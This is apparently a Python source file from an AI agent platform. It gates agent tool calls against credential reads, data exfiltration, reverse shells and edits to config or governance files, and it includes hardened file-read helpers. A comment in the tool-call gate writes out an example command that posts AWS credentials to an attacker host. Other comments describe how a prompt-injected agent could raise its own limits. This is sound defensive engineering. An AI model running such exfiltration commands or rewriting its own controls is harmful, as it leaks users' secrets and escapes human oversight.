"""Config-driven hook system for KiroCrew's message pipeline.

Hooks intercept messages and tool calls based on rules in config.json.
Supports declarative rules and executable script hooks with timeout/sandboxing.
"""

from __future__ import annotations

import asyncio
import fnmatch
import json
import logging
import time
import uuid
from dataclasses import asdict, dataclass, field
from pathlib import Path

from kiro_crew import platform_compat
from kiro_crew.platform import current_context
from kiro_crew.security import (
    audit_bash_exfiltration,
    is_sensitive_bash_command,
    is_sensitive_path,
    is_sensitive_write_path,
)

logger = logging.getLogger(__name__)


# ── Hook Results ──

# Message hook action constants (backward compat — prefer direct string comparison)
HOOK_PASSTHROUGH = "passthrough"
HOOK_REPLY = "reply"
HOOK_MODIFY = "modify"
HOOK_INJECT_CONTEXT = "inject_context"

# Tool hook action constants
TOOL_ALLOW = "allow"
TOOL_AUTO_APPROVE = "auto_approve"
TOOL_DENY = "deny"

# Script hook events (aligned with Kiro CLI)
HOOK_EVENT_AGENT_SPAWN = "AgentSpawn"
HOOK_EVENT_USER_PROMPT_SUBMIT = "UserPromptSubmit"
HOOK_EVENT_PRE_TOOL_USE = "PreToolUse"
HOOK_EVENT_POST_TOOL_USE = "PostToolUse"
HOOK_EVENT_STOP = "Stop"

HOOK_EVENTS = (
    HOOK_EVENT_AGENT_SPAWN,
    HOOK_EVENT_USER_PROMPT_SUBMIT,
    HOOK_EVENT_PRE_TOOL_USE,
    HOOK_EVENT_POST_TOOL_USE,
    HOOK_EVENT_STOP,
)


@dataclass
class HookResult:
    """Result of running message hooks."""

    action: str  # HOOK_PASSTHROUGH, HOOK_REPLY, HOOK_MODIFY, HOOK_INJECT_CONTEXT
    text: str = ""

    @staticmethod
    def passthrough() -> HookResult:
        return HookResult(action=HOOK_PASSTHROUGH)

    @staticmethod
    def reply(text: str) -> HookResult:
        return HookResult(action=HOOK_REPLY, text=text)

    @staticmethod
    def modify(text: str) -> HookResult:
        return HookResult(action=HOOK_MODIFY, text=text)

    @staticmethod
    def inject_context(text: str) -> HookResult:
        return HookResult(action=HOOK_INJECT_CONTEXT, text=text)


@dataclass
class ToolHookResult:
    action: str  # TOOL_ALLOW, TOOL_AUTO_APPROVE, TOOL_DENY
    reason: str = ""

    @staticmethod
    def allow() -> ToolHookResult:
        return ToolHookResult(action=TOOL_ALLOW)

    @staticmethod
    def auto_approve() -> ToolHookResult:
        return ToolHookResult(action=TOOL_AUTO_APPROVE)

    @staticmethod
    def deny(reason: str) -> ToolHookResult:
        return ToolHookResult(action=TOOL_DENY, reason=reason)


# ── Config Types ──


@dataclass
class ContextRule:
    """Inject context when any trigger keyword matches."""

    triggers: list[str] = field(default_factory=list)
    context: str = ""


@dataclass
class AutoReplyHook:
    """Auto-reply without LLM for pattern matches."""

    pattern: str = ""
    reply: str = ""
    exact: bool = False


@dataclass
class TransformHook:
    """Transform message before sending to LLM."""

    pattern: str = ""
    prefix: str = ""
    suffix: str = ""


_BUNDLED_AUTO_APPROVE_TOOLS: list[str] = [
    "kirocrew browse *",
    "*kirocrew browse *",
]


@dataclass
class HooksConfig:
    """Loaded from config.json ``hooks`` section."""

    auto_approve_tools: list[str] = field(default_factory=list)
    auto_approve_sources: list[str] = field(default_factory=list)
    auto_approve_subagent_spawn: bool = False
    auto_approve_subagent_tools: bool = False
    auto_deny_tools: list[str] = field(default_factory=list)
    auto_replies: list[AutoReplyHook] = field(default_factory=list)
    transforms: list[TransformHook] = field(default_factory=list)
    context_rules: list[ContextRule] = field(default_factory=list)

    @classmethod
    def from_dict(cls, data: dict) -> HooksConfig:
        """Parse hooks config from a dict (config.json ``hooks`` section)."""
        auto_replies = [
            AutoReplyHook(
                pattern=h.get("pattern", ""),
                reply=h.get("reply", ""),
                exact=h.get("exact", False),
            )
            for h in data.get("auto_replies", [])
        ]
        transforms = [
            TransformHook(
                pattern=h.get("pattern", ""),
                prefix=h.get("prefix", ""),
                suffix=h.get("suffix", ""),
            )
            for h in data.get("transforms", [])
        ]
        context_rules = [
            ContextRule(
                triggers=r.get("triggers", []),
                context=r.get("context", ""),
            )
            for r in data.get("context_rules", [])
        ]
        user_approve = data.get("auto_approve_tools", [])
        merged_approve = list(dict.fromkeys(_BUNDLED_AUTO_APPROVE_TOOLS + user_approve))
        return cls(
            auto_approve_tools=merged_approve,
            auto_approve_sources=data.get("auto_approve_sources", []),
            auto_approve_subagent_spawn=bool(data.get("auto_approve_subagent_spawn", False)),
            auto_approve_subagent_tools=bool(data.get("auto_approve_subagent_tools", False)),
            auto_deny_tools=data.get("auto_deny_tools", []),
            auto_replies=auto_replies,
            transforms=transforms,
            context_rules=context_rules,
        )


# ── HookManager ──


class HookManager:
    """Process messages and tool calls through config-driven rules."""

    def __init__(self, config: HooksConfig | None = None):
        self._config = config or HooksConfig()

    def reload(self, config: HooksConfig) -> None:
        """Hot-reload hooks config."""
        self._config = config

    @property
    def auto_approve_subagent_spawn(self) -> bool:
        return self._config.auto_approve_subagent_spawn

    @property
    def auto_approve_subagent_tools(self) -> bool:
        return self._config.auto_approve_subagent_tools

    # ── Message hooks ──

    def on_message(self, text: str) -> HookResult:
        """Run message hooks. Returns first match or passthrough."""
        lower = text.lower()

        # Auto-replies (first match wins)
        for ar_hook in self._config.auto_replies:
            if ar_hook.exact:
                if lower == ar_hook.pattern.lower():
                    return HookResult.reply(ar_hook.reply)
            else:
                if ar_hook.pattern.lower() in lower:
                    return HookResult.reply(ar_hook.reply)

        # Transforms (first match wins)
        for tf_hook in self._config.transforms:
            if tf_hook.pattern.lower() in lower:
                modified = text
                if tf_hook.prefix:
                    modified = f"{tf_hook.prefix}\n{modified}"
                if tf_hook.suffix:
                    modified = f"{modified}\n{tf_hook.suffix}"
                return HookResult.modify(modified)

        # Context injection (all matching rules)
        injected: list[str] = []
        for rule in self._config.context_rules:
            if any(t.lower() in lower for t in rule.triggers):
                injected.append(rule.context)
        if injected:
            return HookResult.inject_context("\n\n".join(injected))

        return HookResult.passthrough()

    # ── Tool hooks ──

    def on_tool_call(
        self,
        tool_name: str,
        *,
        session_key: str = "",
        agent: str = "",
        app: str = "",
        tool_kind: str = "",
        raw_params: dict | None = None,
        command: str | None = None,
        is_shell: bool = False,
    ) -> ToolHookResult:
        """Check if a tool should be auto-approved, denied, or handled normally.

        ``tool_name`` is the display title/pill label. For shell tools it may
        be an LLM-authored ``description`` string rather than the literal
        command (``select_tool_title`` in ``acp/_dispatch.py`` prefers
        ``description`` over ``command``), so it is UNTRUSTED for security
        decisions. When the caller has the raw executable command it MUST pass
        it as ``command=``; every security check then also runs against the
        real command, closing the bypass where a benign title/description hid
        a dangerous command (``auto_deny_tools`` and the sensitive-path /
        credential-read protections both keyed off the title otherwise).
        Over-blocking is the safe direction: a match on EITHER the title or the
        command denies. Auto-approve stays keyed on the title only — failing to
        auto-approve merely falls through to interactive approval.

        The optional keyword-only ``session_key`` / ``agent`` / ``app`` identify
        the calling surface so the governance ceiling ∩ active-profile can be
        resolved and a tool/MCP call denied even when the kiro agent config
        granted it (the governance headline behavior).  They default to ``""`` so
        every existing caller is unaffected; a caller that supplies identity opts
        into per-surface governance.

        ``tool_kind`` (the ACP semantic kind: ``read``/``edit``/``fetch``/…) and
        ``raw_params`` (the real tool arguments — ``path``/``url``) let the gate
        enforce the path/host scopes a display title cannot carry
        (``filesystem.write``, ``network.egress``).  Both default to empty, so a
        caller that does not thread them only loses those two arg-derived scopes,
        never the title-derived ones.

        ``is_shell`` enforces deny-by-default for shell tools: when a caller
        reports a shell tool (``is_shell=True``) but cannot supply the raw
        ``command`` (extraction failed — e.g. malformed params), the title
        alone is not a trustworthy basis for a decision, so the call is DENIED
        rather than silently falling through to the title-only checks. Callers
        that always pass a resolved command can leave ``is_shell`` at its
        default; those forwarding an event should pass both the command and the
        event's ``is_shell`` flag.
        """
        # Deny-by-default: a shell tool whose command could not be recovered
        # must not be evaluated on the untrusted title alone — that is the very
        # bypass this gate closes. Reject instead of falling through.
        if is_shell and not command:
            return ToolHookResult.deny(
                "Blocked: shell command could not be verified for security "
                "policy (deny-by-default)"
            )

        # Strip display prefixes (e.g. "Running: ls *" → "ls *") so config
        # patterns like "ls" or "rm *" match without the prefix.
        normalized = _normalize_tool_name(tool_name)

        # Security checks run against the raw command (when available) AND the
        # display title. The command is the ground truth for shell tools; the
        # title is retained so non-shell tools (whose identifier IS the title)
        # stay gated and so a dangerous title can't slip through behind a
        # benign command.
        security_targets = [normalized]
        if command and command not in security_targets:
            security_targets.append(command)

        # Sensitive path protection (always enforced, before all other checks).
        # kiro-cli adds "Reading "/"Running: " display prefixes; the
        # claude-agent-acp adapter does NOT (its file-read title is the bare
        # path, its Bash title the bare command). So the prefix only HINTS at
        # the tool kind — we must run every check on every target regardless of
        # prefix, or credential reads slip through on the Claude Code provider.
        # Each target is the normalized title AND (for shell tools) the raw
        # command, so an LLM-authored benign title can't hide a dangerous
        # command from any of these gates. is_sensitive_path resolves the value
        # as a path: a real file-read title ("~/.aws/credentials") matches,
        # while a bash command ("cat ~/.aws/credentials") resolves to a
        # non-sensitive path and is instead caught by is_sensitive_bash_command.
        for target in security_targets:
            if is_sensitive_path(target):
                return ToolHookResult.deny(f"Blocked: access to sensitive path: {target}")
            # execute_bash (prefixed or bare) — check for reads of sensitive paths.
            reason = is_sensitive_bash_command(target)
            if reason:
                return ToolHookResult.deny(reason)
            # Data-exfiltration / reverse-shell command shapes.
            # The anti-exfil patterns previously lived only in the passive audit
            # path (scan_history / dashboard count) and were never enforced at
            # invocation, so a hijacked agent could `curl -d @~/.aws/credentials
            # evil` or open a reverse shell unblocked. Deny them at the gate —
            # against the raw command too, not just the title.
            reason = audit_bash_exfiltration(target)
            if reason:
                return ToolHookResult.deny(reason)
        # The display title is backend-variable and may NOT carry the path (an
        # "Editing <file>" / generic "code" title does not). The real path lives
        # in raw_params['path'] for file read/edit tools — run the SAME always-on
        # keystone on it so an edit/write to ~/.ssh, ~/.aws, or the governance
        # trust-root files (security_policy.json / profiles) is blocked even when
        # the title hides it. This is the keystone the governance model leans on
        # (agent-cannot-rewrite-its-own-ceiling), so it must not be title-gated.
        if raw_params:
            real_path = raw_params.get("path") or raw_params.get("file_path")
            if isinstance(real_path, str) and real_path and is_sensitive_path(real_path):
                return ToolHookResult.deny(f"Blocked: access to sensitive path: {real_path}")
        # Config files are WRITE-protected (reads stay allowed): block the agent's
        # file-EDIT tool from modifying config.json / config.local.json so a
        # prompt-injected agent cannot rewrite its own resource ceilings
        # (concurrent subagents, turn budget, warm-pool size) to drive host
        # resource exhaustion — pentest: config-loader bound bypass,
        # recommendation to block agent tools from modifying config files. Gated
        # on the ACP ``edit`` kind (the fs_write/code tool) so a plain read of
        # config is unaffected — the dashboard file viewer, ``cat``, and knowledge
        # indexing legitimately read config.json. Defense in depth on top of the
        # loader's load-time clamp, which already neutralizes any inflated value.
        #
        # Empty/unknown ``tool_kind`` (the ACP kind field is spec-optional; some
        # backends omit it) is DELIBERATELY left to the clamp rather than mirrored
        # here. ``governance._scopes_for_call`` (platform/governance.py) infers
        # BOTH filesystem.read AND filesystem.write from a lone ``path`` when the
        # kind is empty, because it is a *policy intersection* where an ungoverned
        # scope permits. This gate is a HARD deny, so applying that same shape
        # inference would also block legitimate config READS that arrive without a
        # kind — regressing the read-allowance that is the whole point of the
        # write-only tier. The load-time clamp is the authoritative backstop for
        # the empty-kind edit vector (and for bash writes like ``tee``/``>``),
        # so intentionally not hard-denying empty-kind keeps the two write-gates
        # from drifting into a read regression.
        if tool_kind == _EDIT_TOOL_KIND and raw_params:
            wpath = raw_params.get("path") or raw_params.get("file_path")
            if isinstance(wpath, str) and wpath and is_sensitive_write_path(wpath):
                return ToolHookResult.deny(
                    f"Blocked: modification of write-protected config path: {wpath}"
                )
        # Built-in security deny list (always enforced).  Route through the
        # active PlatformContext's PolicyAuthority so the Amazon companion's
        # ADD-only deny overlay (+ internal patterns) applies when loaded.  The
        # standalone Default authority uses an empty overlay, so this resolves
        # to ``security.is_denied(name, auto_deny_tools)`` exactly as before —
        # no recursion (PolicyAuthority.is_denied calls security.is_denied with
        # the overlay patterns appended; security.is_denied never calls back).
        # Check the raw command (ground truth) as well as the normalized and
        # original title forms.
        ctx = current_context()
        authority = ctx.security
        deny = self._config.auto_deny_tools
        deny_targets = [normalized, tool_name]
        if command:
            deny_targets.append(command)
        for target in deny_targets:
            reason = authority.is_denied(target, deny)
            if reason:
                return ToolHookResult.deny(reason)

        # Governance ceiling ∩ active profile (Level 1 ∩ Level 2).  Runs BEFORE
        # the auto-approve loop so a governance deny wins over a user
        # auto-approve and is never bypassed.  This is the layer that denies a
        # tool/MCP call even when the kiro agent config granted it: the title for
        # an MCP tool arrives as ``mcp__server__tool`` and is governed by name
        # here regardless of kiro's allowedTools.  No-op on a standalone host
        # with no policy and no bound profile (gate_decision permits), so today's
        # behavior is preserved unless governance is configured.
        gov_reason = _governance_denial(
            ctx, tool_name, session_key, agent, app, tool_kind, raw_params
        )
        if gov_reason:
            return ToolHookResult.deny(gov_reason)

        # Auto-approve — match against both the original title (preserves
        # "Running: "/"Reading " prefixes) and the normalized name (stripped)
        # so that "Running: *" and bare tool-name patterns both work.
        for pattern in self._config.auto_approve_tools:
            if _tool_matches(pattern, tool_name) or _tool_matches(pattern, normalized):
                return ToolHookResult.auto_approve()

        return ToolHookResult.allow()


def _governance_denial(
    ctx: object,
    tool_name: str,
    session_key: str,
    agent: str,
    app: str,
    tool_kind: str = "",
    raw_params: dict | None = None,
) -> str | None:
    """Return a denial reason if governance forbids *tool_name*, else None.

    Resolves the active profile (Level 2) for the calling surface and intersects
    it with the boot-frozen ceiling (Level 1).  Fast no-op when the host has
    neither a policy ceiling nor any profiles, so an ungoverned standalone host
    pays only an attribute read.  Emits a governance audit record on a deny.

    Fail-closed discipline mirrors the CPP shims: a ``PlatformCompositionError``
    (a non-standalone host that could not compose) is re-raised, never swallowed;
    any other unexpected error degrades to "no governance opinion" (None) so a
    transient profile-load glitch cannot wedge every tool call — the always-on
    deny floor above already ran.
    """
    from kiro_crew.platform.context import PlatformCompositionError

    ceiling = getattr(ctx, "governance", None)
    try:
        from kiro_crew.platform.governance import gate_decision
        from kiro_crew.platform.governance_profiles import resolve_active_scope

        profile = resolve_active_scope(session_key, agent=agent, app=app)
        # Nothing to enforce: no ceiling and no bound/forced profile.
        if ceiling is None and profile is None:
            return None
        decision = gate_decision(
            ceiling, profile, tool_name, tool_kind=tool_kind, raw_params=raw_params
        )
        if not decision.permitted:
            _audit_governance(session_key, agent, tool_name, decision)
            return f"Blocked by governance policy: {decision.reason}"
        return None
    except PlatformCompositionError:
        raise
    except Exception:
        # Wrap the late import + audit so a broken/renamed/partially-installed
        # governance_profiles cannot raise ImportError out of this except-branch
        # and convert the intended soft fail-open into a hard fail-closed that
        # wedges every tool call.
        try:
            from kiro_crew.platform.governance_profiles import audit_governance_degraded

            audit_governance_degraded("hooks.on_tool_call", session_key=session_key, app=app)
        except Exception:
            logger.debug("governance degrade audit unavailable", exc_info=True)
        return None


def _audit_governance(session_key: str, agent: str, tool_name: str, decision: object) -> None:
    """Best-effort SEL audit of a governance denial (records scope/rule/layer)."""
    try:
        from kiro_crew.sel import sel

        sel().log_governance_decision(
            session_key=session_key,
            agent=agent or "kirocrew",
            tool_name=tool_name,
            outcome="denied",
            rule=getattr(decision, "rule", ""),
            layer=getattr(decision, "layer", ""),
            reason=getattr(decision, "reason", ""),
        )
    except Exception:
        logger.debug("governance audit emit failed", exc_info=True)


# Display prefixes that kiro-cli ACP adds to tool titles
_TOOL_TITLE_PREFIXES = ("Running: ", "Reading ")

# ACP semantic tool kind for a file write/edit (fs_write / code). The kind that
# carries a real target path in ``raw_params['path']`` and maps to the
# ``filesystem.write`` scope. Used to gate the write-only config-file protection
# so reads are not affected.
_EDIT_TOOL_KIND = "edit"


def _normalize_tool_name(tool_name: str) -> str:
    """Strip display prefixes so hook patterns match the actual tool/command name."""
    for prefix in _TOOL_TITLE_PREFIXES:
        if tool_name.startswith(prefix):
            return tool_name[len(prefix) :]
    return tool_name


def _tool_matches(pattern: str, tool_name: str) -> bool:
    """Match a tool pattern against a tool name.

    Supports: exact, ``prefix*``, ``*suffix``, ``*contains*``, ``*`` (all).
    Case-insensitive.
    """
    if pattern == "*":
        return True
    return fnmatch.fnmatch(tool_name.lower(), pattern.lower())


def validate_file_path(raw: str) -> str | None:
    """Validate and canonicalize a file path for dashboard file I/O.

    Enforces: is_sensitive_path(), realpath canonicalization.
    Returns the canonical path or None if rejected.
    """
    import os

    if not raw:
        return None
    path = os.path.realpath(os.path.expanduser(raw))
    if is_sensitive_path(path):
        return None
    return path


def safe_read_file(path: str) -> str:
    """Read a file after enforcing ``is_sensitive_path``.

    Canonicalizes the path (following every symlink), re-checks the RESOLVED
    target against ``is_sensitive_path`` — so a symlink pointing into ``~/.aws``
    etc. is refused through the link — then opens the canonical path with
    ``O_NOFOLLOW`` as defense-in-depth against a TOCTOU swap of the final
    component into a symlink after the check (AWS-33 / AWS-62).  Opening the
    already-resolved canonical path never rejects a legitimate file (its final
    component is not a symlink by construction), so this only closes the race.

    Raises ``PermissionError`` if the path is sensitive or a symlink race is
    detected. Other read errors (missing file, permission denied) propagate
    unchanged so callers surface accurate messages.
    """
    import errno
    import os

    resolved = os.path.realpath(os.path.expanduser(path))
    if is_sensitive_path(resolved):
        raise PermissionError(f"Blocked: access to sensitive path: {resolved}")
    try:
        fd = os.open(resolved, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except OSError as exc:
        # ELOOP on the canonical (symlink-free) path means a concurrent TOCTOU
        # swap of the final component into a symlink — refuse it. Any other
        # OSError (ENOENT, EACCES) is a normal read error; re-raise as-is.
        if exc.errno in (errno.ELOOP, getattr(errno, "EMLINK", -1)):
            raise PermissionError(
                f"Blocked: refusing to follow symlink at {resolved}"
            ) from exc
        raise
    with os.fdopen(fd, "r", encoding="utf-8") as fh:
        return fh.read()


MAX_FILE_BYTES = 50 * 1024 * 1024  # 50 MB safety cap


class FileTooLargeError(Exception):
    """Raised when a file exceeds MAX_FILE_BYTES."""


def safe_read_file_bytes(raw: str) -> bytes | None:
    """Read file bytes through centralized is_sensitive_path() enforcement.

    ``validate_file_path`` already canonicalizes via ``realpath`` (following
    symlinks) and rejects sensitive resolved targets, so a workspace symlink
    into ``~/.aws`` etc. is refused before any read.  The final open uses
    ``O_NOFOLLOW`` on the canonical path as defense-in-depth against a TOCTOU
    swap of the final component into a symlink after the check (AWS-33).

    Returns file content as bytes, or None if path is rejected or unreadable.
    """
    import os

    path = validate_file_path(raw)
    if path is None:
        return None

    try:
        fd = os.open(path, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except OSError:
        return None
    try:
        with os.fdopen(fd, "rb") as fh:
            data = fh.read(MAX_FILE_BYTES + 1)
        if len(data) > MAX_FILE_BYTES:
            raise FileTooLargeError(f"File exceeds {MAX_FILE_BYTES // (1024 * 1024)} MB safety cap")
        return data
    except OSError:
        return None


def safe_read_file_bytes_with_identity(
    raw: str, allowed_identities: set[tuple[int, int]]
) -> bytes | None:
    """Read file bytes, authorizing the OPENED descriptor by inode identity.

    Like :func:`safe_read_file_bytes`, but closes the authorize-then-read TOCTOU
    window for callers that keep a filesystem allowlist. The file is opened ONCE
    with ``O_NOFOLLOW`` and the ``fstat`` identity ``(st_dev, st_ino)`` of that
    very descriptor MUST be in ``allowed_identities`` before any bytes are
    returned. Because authorization and read share one descriptor, a symlink- or
    directory-swap slipped in between ``realpath`` and ``open`` cannot substitute
    an unauthorized file — its inode is not in the allowlist. ``validate_file_path``
    still rejects sensitive resolved targets (``~/.aws`` …) up front (AWS-33), so
    all filesystem reads stay funnelled through this centralized chokepoint.

    Returns bytes on success. Raises :class:`PermissionError` when the opened
    inode is not allowlisted or a final-component symlink swap is detected
    (``O_NOFOLLOW`` → ``ELOOP``), and :class:`FileTooLargeError` when the file
    exceeds ``MAX_FILE_BYTES``. Returns ``None`` when the path is rejected by
    :func:`validate_file_path` or is otherwise unreadable.
    """
    import errno
    import os

    path = validate_file_path(raw)
    if path is None:
        return None

    try:
        fd = os.open(path, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except OSError as exc:
        if exc.errno in (errno.ELOOP, getattr(errno, "EMLINK", -1)):
            raise PermissionError(f"Blocked: refusing to follow symlink at {path}") from exc
        return None
    try:
        st = os.fstat(fd)
        if (st.st_dev, st.st_ino) not in allowed_identities:
            raise PermissionError("Blocked: file is not in the authorized set")
        with os.fdopen(fd, "rb", closefd=False) as fh:
            data = fh.read(MAX_FILE_BYTES + 1)
        if len(data) > MAX_FILE_BYTES:
            raise FileTooLargeError(f"File exceeds {MAX_FILE_BYTES // (1024 * 1024)} MB safety cap")
        return data
    finally:
        os.close(fd)


def stat_identity(raw: str) -> tuple[int, int] | None:
    """Return ``(st_dev, st_ino)`` of a file through the sensitive-path gate.

    Metadata-only companion to :func:`safe_read_file_bytes_with_identity` for
    callers that must build an inode allowlist from LLM-influenced paths without
    reading content. ``validate_file_path`` canonicalizes via ``realpath`` and
    rejects sensitive resolved targets, so a path that resolves into ``~/.aws``
    etc. is refused (returns ``None``) rather than ``stat``'d — keeping all
    LLM-path filesystem access funnelled through this centralized chokepoint.

    Returns ``(dev, ino)`` or ``None`` if the path is rejected or unstattable.
    """
    import os

    path = validate_file_path(raw)
    if path is None:
        return None
    try:
        st = os.stat(path)
    except OSError:
        return None
    return (st.st_dev, st.st_ino)


def _fd_real_path(fd: int) -> str | None:
    """Real filesystem path of an OPEN descriptor (Linux/macOS), else None."""
    import os

    try:
        return os.readlink(f"/proc/self/fd/{fd}")  # Linux
    except OSError:
        pass
    try:
        import fcntl

        if hasattr(fcntl, "F_GETPATH"):  # macOS
            buf = fcntl.fcntl(fd, fcntl.F_GETPATH, bytes(1024))
            return buf.split(b"\x00", 1)[0].decode()
    except (OSError, ValueError):
        pass
    return None


def safe_read_file_bytes_nolink(raw: str, within_root: str | None = None) -> bytes | None:
    """Like :func:`safe_read_file_bytes` but also rejects hardlinked inodes.

    R30 F1: staging must pin its hardlink check to the SAME inode it reads.
    A caller that lstat()s the path and then opens it by name leaves a race
    window where the file is swapped for a hardlink to a sensitive file
    (e.g. ``~/.aws/config``) between the check and the open. Here the open
    happens first (``O_NOFOLLOW``), then ``fstat()`` on the descriptor —
    the inode that is validated is exactly the inode that is read:
    ``st_nlink > 1`` or a non-regular file type is rejected.

    R33 F1: when ``within_root`` is given, the OPENED descriptor's real path
    (via ``/proc/self/fd`` on Linux, ``fcntl.F_GETPATH`` on macOS) must resolve
    inside that root and must not be sensitive. ``O_NOFOLLOW`` only guards the
    FINAL path component — a nested directory swapped for a symlink between
    the tree walk and the open would silently escape the approved tree. The
    fd-path check is pinned to the inode actually opened, so no check-to-use
    window remains. If the fd's real path cannot be determined, fail closed.

    Returns file content as bytes, or None if the path is rejected,
    hardlinked, non-regular, escaping ``within_root``, or unreadable.
    """
    import os
    import stat as _stat

    path = validate_file_path(raw)
    if path is None:
        return None

    try:
        fd = os.open(path, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except OSError:
        return None
    try:
        st = os.fstat(fd)
        if st.st_nlink > 1 or not _stat.S_ISREG(st.st_mode):
            return None
        if within_root is not None:
            fd_real = _fd_real_path(fd)
            if fd_real is None:
                return None  # cannot verify containment -> fail closed
            root_real = os.path.realpath(within_root)
            if os.path.commonpath([fd_real, root_real]) != root_real:
                return None  # opened inode escapes the approved tree
            if is_sensitive_path(fd_real):
                return None
        with os.fdopen(fd, "rb") as fh:
            data = fh.read(MAX_FILE_BYTES + 1)
        fd = -1  # consumed by fdopen
        if len(data) > MAX_FILE_BYTES:
            raise FileTooLargeError(f"File exceeds {MAX_FILE_BYTES // (1024 * 1024)} MB safety cap")
        return data
    except OSError:
        return None
    finally:
        if fd >= 0:
            try:
                os.close(fd)
            except OSError:
                pass


def safe_copy_file_nolink(raw: str, dest_dir: str) -> str | None:
    """Copy a file into *dest_dir* with the full descriptor-pinned validation
    chain; return the private copy's path, or None if the source is rejected.

    For large binaries (media files) that libraries must consume BY PATH from
    a subprocess: the bytes are streamed from the vetted descriptor into a
    freshly created 0600 temp file inside *dest_dir*, so downstream readers
    never touch the caller-influenced original path again.

    Validation mirrors :func:`safe_read_file_bytes_nolink`: open first
    (``O_NOFOLLOW``), then ``fstat()`` on the descriptor (regular file,
    ``st_nlink == 1``), then the OPENED descriptor's real path (via
    ``/proc/self/fd`` on Linux, ``fcntl.F_GETPATH`` on macOS) must not be
    sensitive. ``O_NOFOLLOW`` only guards the FINAL path component — an
    ancestor directory swapped for a symlink between validation and open
    would otherwise reach a sensitive file. The fd-path check is pinned to
    the inode actually opened and copied, so no check-to-use window remains.
    If the fd's real path cannot be determined, fail closed.
    """
    import os
    import stat as _stat
    import tempfile

    path = validate_file_path(raw)
    if path is None:
        return None

    try:
        fd = os.open(path, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except OSError:
        return None
    tmp_fd = -1
    tmp_path: str | None = None
    try:
        st = os.fstat(fd)
        if st.st_nlink > 1 or not _stat.S_ISREG(st.st_mode):
            return None
        fd_real = _fd_real_path(fd)
        if fd_real is None:
            return None  # cannot verify what was opened -> fail closed
        if is_sensitive_path(fd_real):
            return None
        tmp_fd, tmp_path = tempfile.mkstemp(
            prefix=".safe-copy-", suffix=os.path.splitext(fd_real)[1], dir=dest_dir
        )
        while True:
            chunk = os.read(fd, 1 << 20)
            if not chunk:
                break
            view = memoryview(chunk)
            while view:
                written = os.write(tmp_fd, view)
                view = view[written:]
        return tmp_path
    except OSError:
        if tmp_path is not None:
            try:
                os.unlink(tmp_path)
            except OSError:
                pass
        return None
    finally:
        try:
            os.close(fd)
        except OSError:
            pass
        if tmp_fd >= 0:
            try:
                os.close(tmp_fd)
            except OSError:
                pass


def safe_read_prefix(raw: str, n: int) -> bytes | None:
    """Read the first *n* bytes of a file through is_sensitive_path enforcement.

    Like :func:`safe_read_file_bytes` but reads only a bounded prefix, for
    magic-byte / format sniffing of large binaries that exceed
    ``MAX_FILE_BYTES`` (e.g. the ~100 MB kiro-cli binary). ``validate_file_path``
    canonicalizes via ``realpath`` (following symlinks) and rejects sensitive
    resolved targets, so a symlink pointing into ``~/.aws`` etc. is refused
    before any read. The open uses ``O_NOFOLLOW`` on the canonical path as
    TOCTOU defense against a final-component symlink swap after the check.

    Returns up to *n* bytes, or None if the path is rejected or unreadable.
    """
    import os

    if n <= 0:
        return b""
    path = validate_file_path(raw)
    if path is None:
        return None
    try:
        fd = os.open(path, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except OSError:
        return None
    try:
        with os.fdopen(fd, "rb") as fh:
            return fh.read(n)
    except OSError:
        return None


# ---------------------------------------------------------------------------
# Internal authorized reads of sensitive paths
# ---------------------------------------------------------------------------
#
# The default ``safe_read_file`` / ``safe_read_file_bytes`` paths refuse any
# path that ``is_sensitive_path`` flags. A small set of **internal system**
# operations legitimately need to read a file ``is_sensitive_path`` blocks.
# Rather than have those callers reach for ``Path.read_bytes`` directly --
# which would scatter sensitive-path reads across the codebase and make the
# audit story ad-hoc -- they go through ``safe_read_file_internal(read_id)``,
# which consults this hardcoded allowlist, performs the read, and emits an SEL
# audit event on every outcome.
#
# Adding a new entry is a security-review event: it widens the set of sensitive
# reads that can happen outside the deny rule. Each entry's comment must justify
# why the read is system infrastructure (the bytes leaving the process never
# reach an LLM/agent surface) rather than LLM/agent-mediated content.
#
# The `backend-security-controls` rule requires reads of
# "user- or LLM-influenced paths" to pass is_sensitive_path() and explicitly
# EXEMPTS "trusted fixed-path internal ... reads". Every read_id here maps to a
# HARDCODED constant path (never derived from user/LLM/config input), the read
# is SEL-audited on every outcome and fail-closed (a success whose audit cannot
# be persisted returns None), the open is O_NOFOLLOW + fstat, and the target
# stores are themselves classified sensitive in security._SENSITIVE_HOME_DIRS
# so agent file tools cannot reach them. This is the sanctioned fixed-path
# internal case the rule exempts, not a weakening of the keystone.
_INTERNAL_READ_ALLOWLIST: dict[str, str] = {
    # ``kiro_crew.dashboard.handlers.kiro_usage_api`` reads the kiro-cli SSO
    # access token to authenticate a single ``GetUsageLimits`` call to the
    # hardcoded CodeWhisperer RTS endpoint
    # (``codewhisperer.us-east-1.amazonaws.com``) that powers the dashboard
    # credit-usage pill -- the same API the Kiro IDE credit meter uses. The
    # token bytes go only to that AWS endpoint over TLS; only the parsed numeric
    # usage dict returns to the process, and it is run through
    # ``redact_credentials``/``redact_exfiltration_urls`` before caching, so the
    # credential never reaches an LLM/agent surface. The operator already
    # trusted KiroCrew with the session by running ``kiro-cli login`` outside
    # any agent loop. (On Linux the live token lives in the kiro-cli SQLite
    # store, which is not a sensitive path; these JSON entries cover the IDE /
    # older kiro-cli cache layout.)
    "kiro_usage_api.sso_token_cli": ".aws/sso/cache/kiro-auth-token-cli.json",
    "kiro_usage_api.sso_token_ide": ".aws/sso/cache/kiro-auth-token.json",
}


def register_internal_read_path(read_id: str, rel_path: str) -> None:
    """Register an edition-contributed fixed-path internal-read carve-out.

    The composition-time seam an edition companion uses to add its own trusted
    fixed-path reads (e.g. an SSO cookie jar for the usage-upload path) to
    ``_INTERNAL_READ_ALLOWLIST`` — the exact structural twin of the boot-time
    ``register_acp_backends`` / ``register_publish_providers`` seams.  This is
    NOT an agent-reachable API: it is called once, from the companion's boot
    composition, with HARDCODED constant arguments.  It never widens what
    ``safe_read_file_internal`` will read at call time — that function still
    re-verifies the resolved path is sensitive, opens O_NOFOLLOW, and SEL-audits
    every outcome — this only lets an edition contribute an entry to the same
    guarded table the core ships.

    Guards (fail-closed, so a mis-registration cannot open a hole):

    * ``read_id`` must be a non-empty string; re-registering an existing key with
